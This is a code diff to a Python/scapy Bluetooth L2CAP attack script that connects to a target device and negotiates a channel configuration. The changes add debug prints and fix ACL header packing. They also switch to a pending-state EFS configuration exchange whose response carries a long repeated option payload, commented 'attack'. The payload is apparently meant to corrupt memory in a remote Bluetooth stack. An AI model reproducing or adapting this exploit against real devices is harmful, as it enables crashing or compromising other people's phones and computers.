@@ -156,9 +156,16 @@ class L2CAP(object):
     def _unpack_packet_handle_and_flags(self, packet):
         assert HCI_ACL_Hdr in packet
         # HCI_ACL_Hdr definition in scapy is wrong; don't have time to fix it
+	# daveti: what if it is fixed
+	'''
         packet_handle  = (packet[HCI_ACL_Hdr].flags & 0x0f) << 8
         packet_handle |= packet[HCI_ACL_Hdr].handle
         packet_flags = packet[HCI_ACL_Hdr].flags >> 4
+	'''
+	# daveti: if we assume scapy done the conversion
+	packet_handle = packet[HCI_ACL_Hdr].handle
+	packet_flags = packet[HCI_ACL_Hdr].flags
+
         return packet_handle, packet_flags
 
     def _is_relevant(self, packet):
@@ -217,8 +224,13 @@ class L2CAP(object):
         if not is_first:
             flags |= 1
         # HCI_ACL_Hdr is a piece of shit, also see rant above
+	'''
         scapy_handle = self._handle & 0xff
         scapy_flags = self._handle >> 8 | ((flags & 0x0f) << 4)
+	'''
+	# daveti: assume scapy is doing its job now
+	scapy_handle = self._handle
+	scapy_flags = flags;
 
         hci = HCI_Hdr() / HCI_ACL_Hdr(handle=scapy_handle, flags=scapy_flags) / frag
         self._loop.on(lambda pkt: (pkt is not None and
@@ -386,9 +398,18 @@ def lockstep_efs_conf_process(loop, scid, dcid):
     loop.send(conf_req)
     conf_resp = loop.cont()[0]
 
+    #daveti: debug
+    print("daveti: into l2cap pending state now")
+
+    '''
     resp = (L2CAP_Hdr(cid=1) / L2CAP_CmdHdr(id=conf_req.id) /
             L2CAP_ConfResp(scid=dcid, flags=0, result=4) /
             Raw(binascii.unhexlify('01020004')))
+    '''
+    # daveti: attack
+    resp = (L2CAP_Hdr(cid=1) / L2CAP_CmdHdr(id=conf_req.id) /
+            L2CAP_ConfResp(scid=dcid, flags=0, result=4) /
+            Raw(binascii.unhexlify('01020004010200040102000401020004010200040102000401020004010200040102000401020004010200040102000401020004010200040102000401020004')))
     loop.on(lambda conf_resp: conf_resp is not None and
                               conf_resp.id == 1 and
                               L2CAP_ConfResp in conf_resp and
@@ -436,6 +457,9 @@ def handle_information_negotiation_process(l2cap_loop):
     assert l2cap_loop.cont() == [True]
     assert l2cap_loop.cont() == [True]
 
+    #daveti: debug
+    print("daveti: infoReq done");
+
     # The same practice as above, only for the "fixed channels" info request\response.
     
     info_req = L2CAP_Hdr(cid=1) / L2CAP_CmdHdr(id=1) / L2CAP_InfoReq(type=3)
@@ -445,6 +469,9 @@ def handle_information_negotiation_process(l2cap_loop):
     
     assert l2cap_loop.cont() == [True]
     assert l2cap_loop.cont() == [True]
+
+    #daveti: debug
+    print("daveti: infoReq fixed chan done");
     
     
 def create_l2cap_connection(interface, target, psm='SDP', with_mutual_config=True, pcap_path=None):
@@ -457,10 +484,17 @@ def create_l2cap_connection(interface, target, psm='SDP', with_mutual_config=Tru
         
     loop = Loop(user_socket)
     reset(loop)
+
+    # daveti: debug
+    print("daveti: start acl_connect")
+
     is_connected, handle = acl_connect(loop, target)
     if not is_connected:
         print("Unable to connect target via Bluetooth")
         sys.exit(1)
+
+    # daveti: debug
+    print("daveti: end acl_connect")
     
     print('Handle = %04x' % (handle, ))
     
@@ -501,8 +535,13 @@ def l2cap_mutual_configration(l2cap_loop, dcid):
     # Register handler to accept any configuration request coming from the other peer.
     reply_to_conf_req_accept(l2cap_loop, OUR_LOCAL_SCID, dcid)
     # Negotiate our own configuration parametres, using the lockstep procedure (using the pending state)
-    standard_conf_process(l2cap_loop, OUR_LOCAL_SCID, dcid)
+    #standard_conf_process(l2cap_loop, OUR_LOCAL_SCID, dcid)
     # Reaching this phase, the connection is in CONNECTED state.
+
+    # daveti: using EFS conf process
+    print("daveti: starting efs conf process")
+    lockstep_efs_conf_process(l2cap_loop, OUR_LOCAL_SCID, dcid)
+
     
 def main(src_hci, dst_bdaddr, pcap_path=None):
     l2cap_loop, _ = create_l2cap_connection(src_hci, dst_bdaddr, pcap_path=pcap_path)
